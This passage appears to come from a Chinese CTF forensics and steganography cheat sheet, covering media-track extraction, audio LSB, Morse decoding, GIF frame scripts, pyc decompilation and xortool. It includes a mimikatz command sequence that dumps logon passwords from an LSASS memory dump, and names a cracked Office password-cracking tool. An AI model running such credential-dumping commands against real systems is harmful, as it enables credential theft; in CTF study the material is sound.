class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">1</span></span><br><span class="line">DTMF: <span class="number">6</span></span><br><span class="line">DTMF: <span class="number">0</span></span><br><span class="line">DTMF: <span class="number">9</span></span><br></pre></td></tr></table></figure><h3 id="mkvinfo"><a href="#mkvinfo" class="headerlink" title="mkvinfo"></a>mkvinfo</h3><p>MKVToolNix是一套功能强大的<a href="https://baike.baidu.com/item/mkv/1658908">mkv</a>(Matroska)格式制作和处理的工具，支持将多种视频、音频、字幕等格式封装成mkv格式，支持提取mkv内音频及字幕到文件。</p><p>注意轨道和轨道类型。这里有三个轨道，可以看到这里有三个轨道–a video, an audio and a subs track。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ mkvinfo ogreman</span><br><span class="line">+ EBML 头</span><br><span class="line">|+ EBML 版本: <span class="number">1</span></span><br><span class="line">|+ EBML 读取版本: <span class="number">1</span></span><br><span class="line">|+ EBML ID 最大长度: <span class="number">4</span></span><br><span class="line">|+ EBML 大小最大长度: <span class="number">8</span></span><br><span class="line">|+ 文档类型: matroska</span><br><span class="line">|+ 文档类型版本: <span class="number">2</span></span><br><span class="line">|+ 文档类型读取版本: <span class="number">2</span></span><br><span class="line">+ 剪辑: 大小 <span class="number">159642</span></span><br><span class="line">|+ 定位头 (子条目将被跳过)</span><br><span class="line">|+ EBML void: 大小 <span class="number">148</span></span><br><span class="line">|+ 剪辑信息</span><br><span class="line">| + 时间戳缩放: <span class="number">1000000</span></span><br><span class="line">| + 混流应用程序: Lavf55<span class="number">.12</span><span class="number">.0</span></span><br><span class="line">| + 写入应用程序: HandBrake <span class="number">0.10</span><span class="number">.5</span> <span class="number">2016021100</span></span><br><span class="line">| + 剪辑 UID: <span class="number">0x26</span> <span class="number">0xdd</span> <span class="number">0x34</span> <span class="number">0x12</span> <span class="number">0x3f</span> <span class="number">0xa9</span> <span class="number">0xec</span> <span class="number">0x24</span> <span class="number">0xe6</span> <span class="number">0x53</span> <span class="number">0x9e</span> <span class="number">0xd3</span> <span class="number">0x45</span> <span class="number">0xe1</span> <span class="number">0xc1</span> <span class="number">0xe4</span></span><br><span class="line">| + 时长: <span class="number">00</span>:<span class="number">00</span>:<span class="number">02.500000000</span></span><br><span class="line">|+ 轨道</span><br><span class="line">| + 轨道</span><br><span class="line">|  + 轨道编号: <span class="number">1</span> (mkvmerge &amp; mkvextract 的轨道 ID: <span class="number">0</span>)</span><br><span class="line">|  + 轨道 UID: <span class="number">1</span></span><br><span class="line">|  + 紧缩标记: <span class="number">0</span></span><br><span class="line">|  + 语言: und</span><br><span class="line">|  + 编码格式 ID: V_MPEG4/ISO/AVC</span><br><span class="line">|  + 轨道类型: 视频</span><br><span class="line">|  + 默认帧时长: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.033333333</span> (对应视频轨的 <span class="number">30.000</span> 帧/场每秒)</span><br><span class="line">|  + 视频轨道</span><br><span class="line">|   + 像素宽度: <span class="number">1156</span></span><br><span class="line">|   + 像素高度: <span class="number">720</span></span><br><span class="line">|   + 显示器宽度: <span class="number">1156</span></span><br><span class="line">|   + 显示器高度: <span class="number">720</span></span><br><span class="line">|   + 显示器单位: <span class="number">3</span> (宽高比)</span><br><span class="line">|  + 编解码器私有数据: 大小 <span class="number">44</span> (H<span class="number">.264</span> 档次: Main @L4<span class="number">.0</span>)</span><br><span class="line">| + 轨道</span><br><span class="line">|  + 轨道编号: <span class="number">2</span> (mkvmerge &amp; mkvextract 的轨道 ID: <span class="number">1</span>)</span><br><span class="line">|  + 轨道 UID: <span class="number">2</span></span><br><span class="line">|  + 紧缩标记: <span class="number">0</span></span><br><span class="line">|  + 名称: Stereo</span><br><span class="line">|  + 语言: und</span><br><span class="line">|  + 编码格式 ID: A_AAC</span><br><span class="line">|  + 轨道类型: 音频</span><br><span class="line">|  + 音频轨</span><br><span class="line">|   + 声道数: <span class="number">2</span></span><br><span class="line">|   + 采样率: <span class="number">44100.0</span></span><br><span class="line">|  + 编解码器私有数据: 大小 <span class="number">5</span></span><br><span class="line">| + 轨道</span><br><span class="line">|  + 轨道编号: <span class="number">3</span> (mkvmerge &amp; mkvextract 的轨道 ID: <span class="number">2</span>)</span><br><span class="line">|  + 轨道 UID: <span class="number">3</span></span><br><span class="line">|  + 紧缩标记: <span class="number">0</span></span><br><span class="line">|  + 语言: eng</span><br><span class="line">|  + 默认轨道标记: <span class="number">0</span></span><br><span class="line">|  + 编码格式 ID: S_TEXT/ASS</span><br><span class="line">|  + 轨道类型: 字幕</span><br><span class="line">|  + 编解码器私有数据: 大小 <span class="number">481</span></span><br><span class="line">|+ 标签</span><br><span class="line">| + 标签</span><br><span class="line">|  + 目标</span><br><span class="line">|  + 简单</span><br><span class="line">|   + 名称: CREATION_TIME</span><br><span class="line">|   + 字符串: <span class="number">2016</span><span class="number">-11</span><span class="number">-22</span>T23:<span class="number">49</span>:<span class="number">31</span>Z</span><br><span class="line">|  + 简单</span><br><span class="line">|   + 名称: ENCODER</span><br><span class="line">|   + 字符串: Lavf55<span class="number">.12</span><span class="number">.0</span></span><br><span class="line">| + 标签</span><br><span class="line">|  + 目标</span><br><span class="line">|   + 轨道 UID: <span class="number">2</span></span><br><span class="line">| + 标签</span><br><span class="line">|  + 目标</span><br><span class="line">|   + 轨道 UID: <span class="number">3</span></span><br><span class="line">|+ 簇</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="mkvextract"><a href="#mkvextract" class="headerlink" title="mkvextract"></a>mkvextract</h3><p>提取三个轨道的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkvextract tracks ogreman 0:video 1:audio 2:subs</span><br><span class="line">steady@steady:~$ mkvextract tracks &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;output&#x2F;png&#x2F;ogreman 0:video 1:audio 2:subs</span><br><span class="line">正在将 CodecID 为 V_MPEG4&#x2F;ISO&#x2F;AVC 的轨道 0 提取到文件「video」。容器格式: AVC&#x2F;H.264 elementary stream                                  </span><br><span class="line">正在将 CodecID 为 A_AAC 的轨道 1 提取到文件「audio」。容器格式: raw AAC file with ADTS headers                                               </span><br><span class="line">正在将 CodecID 为 S_TEXT&#x2F;ASS 的轨道 2 提取到文件「subs」。容器格式: SSA&#x2F;ASS text subtitles                                                     </span><br><span class="line">进度: 100% </span><br></pre></td></tr></table></figure><p>查看我文件即可获取flag。</p><h3 id="mediainfo-1"><a href="#mediainfo-1" class="headerlink" title="mediainfo"></a>mediainfo</h3><p>查看音频元数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/tools/stegoVeritas-master/stegoveritas$ mediainfo /home/steady/桌面/tools/music.wav</span><br><span class="line">General</span><br><span class="line">Complete name                            : /home/steady/桌面/tools/music.wav</span><br><span class="line">Format                                   : Wave</span><br><span class="line">File size                                : <span class="number">313</span> KiB</span><br><span class="line">Duration                                 : <span class="number">20</span> s <span class="number">0</span> ms</span><br><span class="line">Overall bit rate mode                    : Constant</span><br><span class="line">Overall bit rate                         : <span class="number">128</span> kb/s</span><br><span class="line"></span><br><span class="line">Audio</span><br><span class="line">Format                                   : PCM</span><br><span class="line">Format settings                          : Little / Signed</span><br><span class="line">Codec ID                                 : <span class="number">1</span></span><br><span class="line">Duration                                 : <span class="number">20</span> s <span class="number">0</span> ms</span><br><span class="line">Bit rate mode                            : Constant</span><br><span class="line">Bit rate                                 : <span class="number">128</span> kb/s</span><br><span class="line">Channel(s)                               : <span class="number">1</span> channel</span><br><span class="line">Sampling rate                            : <span class="number">8</span> <span class="number">000</span> Hz</span><br><span class="line">Bit depth                                : <span class="number">16</span> bits</span><br><span class="line">Stream size                              : <span class="number">312</span> KiB (<span class="number">100</span>%)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Steganography"><a href="#Steganography" class="headerlink" title="Steganography"></a>Steganography</h3><p>音频lsb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;.local&#x2F;bin$ &#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegolsb wavsteg </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python WavSteg.py -r -s 咻咻咻.wav -o output -n <span class="number">1</span> -b <span class="number">1000</span> &amp;&amp; cat output</span><br></pre></td></tr></table></figure><h3 id="morse2ascii"><a href="#morse2ascii" class="headerlink" title="morse2ascii"></a>morse2ascii</h3><p>使用au软件，将音频文件导出为wav文件。(前提是能分离立体声到单声道。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ morse2ascii &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/45.png" alt="45"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ morse2ascii &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;4.wav</span><br><span class="line">  wave size      1025374</span><br><span class="line">  format tag     1</span><br><span class="line">  channels:      1</span><br><span class="line">  samples&#x2F;sec:   8000</span><br><span class="line">  avg&#x2F;bytes&#x2F;sec: 16000</span><br><span class="line">  block align:   2</span><br><span class="line">  bits:          16</span><br><span class="line">  samples:       512687</span><br><span class="line">  bias adjust:   43</span><br><span class="line">  volume peaks:  -2486 2487</span><br><span class="line">  normalize:     30280</span><br><span class="line">  resampling to  8000hz</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">f029bd6f551139eedeb8e45a175b0786  f029bd6f5</span><br></pre></td></tr></table></figure><h2 id="strings命令"><a href="#strings命令" class="headerlink" title="strings命令"></a>strings命令</h2><p>使用strings命令查看当前文件夹所有文件内容并截取敏感字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings * | grep &quot;flag&quot;</span><br></pre></td></tr></table></figure><p>使用strings命令查看指定文件夹中的文件的所有内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;flag&quot; -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;眼见非实</span><br></pre></td></tr></table></figure><p>快速查看jpg有无属性信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings misc2.jpg | grep &quot;?xpacket&quot;</span><br></pre></td></tr></table></figure><h2 id="word文档"><a href="#word文档" class="headerlink" title="word文档"></a>word文档</h2><h3 id="改变文字颜色"><a href="#改变文字颜色" class="headerlink" title="改变文字颜色"></a>改变文字颜色</h3><h3 id="取消隐藏文字"><a href="#取消隐藏文字" class="headerlink" title="取消隐藏文字"></a>取消隐藏文字</h3><p>选项–&gt;视图–&gt;隐藏文字。</p><h2 id="01editor"><a href="#01editor" class="headerlink" title="01editor"></a>01editor</h2><h3 id="翻转十六进制"><a href="#翻转十六进制" class="headerlink" title="翻转十六进制"></a>翻转十六进制</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/14.png" alt="14"></p><h2 id="GIF图片"><a href="#GIF图片" class="headerlink" title="GIF图片"></a>GIF图片</h2><h3 id="图片分帧"><a href="#图片分帧" class="headerlink" title="图片分帧"></a>图片分帧</h3><p>Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分离gif.py</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">savepath = <span class="string">&quot;C:/Users/12521/flag/&quot;</span> <span class="comment">#保存路径</span></span><br><span class="line"></span><br><span class="line">im = Image.open(<span class="string">&#x27;1.gif&#x27;</span>)   <span class="comment">#从文件加载图像</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    im.save(savepath+<span class="string">&#x27;&#123;:d&#125;.png&#x27;</span>.format(im.tell())) <span class="comment">#读取每一帧</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        im.seek(im.tell()+<span class="number">1</span>) <span class="comment">#在不同帧之间移动</span></span><br><span class="line">        im.save(savepath+<span class="string">&#x27;&#123;:d&#125;.png&#x27;</span>.format(im.tell()))  <span class="comment">#保存文件</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>GIF分帧工具</p><p><code>GifSplitter.exe</code></p><p>kali分帧工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert flag.gif flag.png</span><br></pre></td></tr></table></figure><h3 id="图片合并"><a href="#图片合并" class="headerlink" title="图片合并"></a>图片合并</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment">#</span></span><br><span class="line">res = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">402</span>,<span class="number">600</span>)) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">201</span>): </span><br><span class="line">filename = <span class="string">f&quot;./flag/<span class="subst">&#123;x&#125;</span>.png&quot;</span> </span><br><span class="line">print(filename) </span><br><span class="line">tmp = Image.open(filename)</span><br><span class="line">res.paste(tmp,(x*<span class="number">2</span>,<span class="number">0</span>))</span><br><span class="line">plt.imshow(res) </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拼接图像.py</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;C:/Users/12521/flag/&quot;</span></span><br><span class="line">save_path = <span class="string">&#x27;C:/Users/12521/&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>)) <span class="comment">#创建新照片</span></span><br><span class="line">imagefile = [] <span class="comment">#存储所有的图像的名称</span></span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">201</span>):</span><br><span class="line">    imagefile.append(Image.open(path+str(i)+<span class="string">&#x27;.png&#x27;</span>)) <span class="comment">#遍历，将图像名称存入imagfile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> imagefile:</span><br><span class="line">    im.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>)) <span class="comment">#将图片张贴到另一张图片上</span></span><br><span class="line">    width = width +<span class="number">2</span> 别以<span class="number">7</span></span><br><span class="line">im.save(save_path+<span class="string">&#x27;steady.png&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p>使用kali工具合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# montage flag*.png -tile x1 -geometry +0+0 flag.png</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</span><br><span class="line">-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可。</span><br></pre></td></tr></table></figure><h3 id="每一帧的间隔时间"><a href="#每一帧的间隔时间" class="headerlink" title="每一帧的间隔时间"></a>每一帧的间隔时间</h3><p>通过<code>identify</code>命令清晰的打印出每一帧的时间间隔。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ identify -format <span class="string">&quot;%s %T \n&quot;</span> <span class="number">100.</span>gif</span><br><span class="line">第n帧 间隔时间</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;_key.ftm.extracted$ identify -verbose flag.gif | grep Delay</span><br></pre></td></tr></table></figure><h2 id="Python隐写"><a href="#Python隐写" class="headerlink" title="Python隐写"></a>Python隐写</h2><h3 id="unpy2exe"><a href="#unpy2exe" class="headerlink" title="unpy2exe"></a>unpy2exe</h3><p>编译文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unpy2exe.py -o calc calc.exe</span><br></pre></td></tr></table></figure><h3 id="uncompyle6"><a href="#uncompyle6" class="headerlink" title="uncompyle6"></a>uncompyle6</h3><p>拿到pyc文件使用工具得到py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:/tmp/uncompyle6/bin$steady@steady:~$ /home/steady/桌面/tools/python-uncompyle6-master/bin/uncompyle6 /home/steady/桌面/steady/<span class="number">4.</span>pyc</span><br></pre></td></tr></table></figure><h3 id="stegosaurus"><a href="#stegosaurus" class="headerlink" title="stegosaurus"></a>stegosaurus</h3><p>使用工具解出藏有的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:/tmp/stegosaurus$ ./stegosaurus -x /tmp/QAQ.pyc</span><br></pre></td></tr></table></figure><h3 id="python序列化内容的存入"><a href="#python序列化内容的存入" class="headerlink" title="python序列化内容的存入"></a>python序列化内容的存入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle  </span><br><span class="line"></span><br><span class="line">fp &#x3D; open(&quot;2.txt&quot;,&quot;rb+&quot;)      &#39;&#39;&#39; 打开序列化文件 &#39;&#39;&#39;</span><br><span class="line">fw &#x3D; open(&#39;pickle.txt&#39;, &#39;w&#39;)  &#39;&#39;&#39; 打开保存文件 &#39;&#39;&#39;</span><br><span class="line">a&#x3D;pickle.load(fp)             &#39;&#39;&#39; 反序列化文件编译 &#39;&#39;&#39;</span><br><span class="line">pickle&#x3D;str(a)                 &#39;&#39;&#39; 转换成字符串要不然不能保存 &#39;&#39;&#39;</span><br><span class="line">fw.write( pickle )            &#39;&#39;&#39; 写入文件 &#39;&#39;&#39;</span><br><span class="line">fw.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br><span class="line">fp.close()                    &#39;&#39;&#39; 关闭文件 &#39;&#39;&#39;</span><br></pre></td></tr></table></figure><h2 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h2><h3 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &#x2F;B 文件1+文件2+... 合并文件名.rar</span><br></pre></td></tr></table></figure><h3 id="生成十六进制"><a href="#生成十六进制" class="headerlink" title="生成十六进制"></a>生成十六进制</h3><p><code>xxd</code>命令生成一个hex文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -r 文件 hex</span><br></pre></td></tr></table></figure><h2 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">→  ~ b64steg.py -f stego.txt -s output.txt</span><br><span class="line">Base_sixty_four_point_five</span><br></pre></td></tr></table></figure><h2 id="excle"><a href="#excle" class="headerlink" title="excle"></a>excle</h2><p>修改后缀为rar</p><p><code>strings</code>直接搜索flag。</p><h2 id="word、ppt"><a href="#word、ppt" class="headerlink" title="word、ppt"></a>word、ppt</h2><p>直接搜索flag，修改颜色。</p><p>转换为zip，或者zip转换doc。</p><p>doc如果打不开，尝试放入winhex，将某处改为FF。</p><p>使用工具破解密码，<code>AccentOPR.CracKed.By.Hmily[LCG][LSG]</code>。</p><p>ppt也可以改变颜色，拿到隐藏的文字。</p><p>如果文字复制不了需要先格式刷</p><h2 id="vmdk"><a href="#vmdk" class="headerlink" title="vmdk"></a>vmdk</h2><p>拿到这个文件，可以先使用7z当作压缩包打开。</p><p>其次对.fat文件进行挂载。</p><h2 id="迷你卡兹"><a href="#迷你卡兹" class="headerlink" title="迷你卡兹"></a>迷你卡兹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><h2 id="xortool"><a href="#xortool" class="headerlink" title="xortool"></a>xortool</h2><p>猜测xor加密的密码长度以值(key)</p><p>使用方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xortool (-x) -c 20 123.txt</span><br><span class="line">#-x：代表文件内容为十六进制</span><br><span class="line">#-c：后加出现频率最高的字符，文本内容一般是空格（20），二进制文件一般是00</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ /home/steady/.local/bin/xortool  -c <span class="number">20</span> /home/steady/桌面/steady/badd3e0621ff43de8cf802545bbd3ed0</span><br><span class="line">The most probable key lengths:</span><br><span class="line"> <span class="number">2</span>:  <span class="number">12.2</span>%</span><br><span class="line"> <span class="number">5</span>:  <span class="number">11.9</span>%</span><br><span class="line"> <span class="number">9</span>:   <span class="number">9.8</span>%</span><br><span class="line"><span class="number">13</span>:  <span class="number">22.2</span>%</span><br><span class="line"><span class="number">20</span>:   <span class="number">6.8</span>%</span><br><span class="line"><span class="number">22</span>:   <span class="number">6.2</span>%</span><br><span class="line"><span class="number">26</span>:  <span class="number">12.8</span>%</span><br><span class="line"><span class="number">30</span>:   <span class="number">4.6</span>%</span><br><span class="line"><span class="number">39</span>:   <span class="number">7.8</span>%</span><br><span class="line"><span class="number">52</span>:   <span class="number">5.7</span>%</span><br><span class="line">Key-length can be <span class="number">3</span>*n</span><br><span class="line"><span class="number">1</span> <span class="function">possible <span class="title">key</span><span class="params">(s)</span> of length 13:</span></span><br><span class="line">Good\tuckToYou</span><br><span class="line">Found <span class="number">1</span> plaintexts with <span class="number">95</span>%+ valid characters</span><br><span class="line">See files filename-key.csv, filename-char_used-perc_valid.csv</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="PDF隐写"><a href="#PDF隐写" class="headerlink" title="PDF隐写"></a>PDF隐写</h3><p> wbStego4.3open</p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>1、任何文件都可以尝试一下ntfs隐写，不要在过于在意压缩包中的图片，有时候压缩包也可能存在ntfs隐写。</p><p>2、图片如果在win下可以正常访问，但是在linux无法访问，一定要尝试crc爆破，修改高度。</p><p>3、jpg、png图片都可以修改高度和宽度。</p><p>4、遇到jpg文件多查看一下文件属性。</p><p>5、遇到图片使用strings查看一下有没有敏感字符。</p><p>6、jpg图片藏有一下信息，属性中一定有信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;x:xmpmeta xmlns:x&#x3D;&quot;adobe:ns:meta&#x2F;&quot;&gt;&lt;rdf:RDF 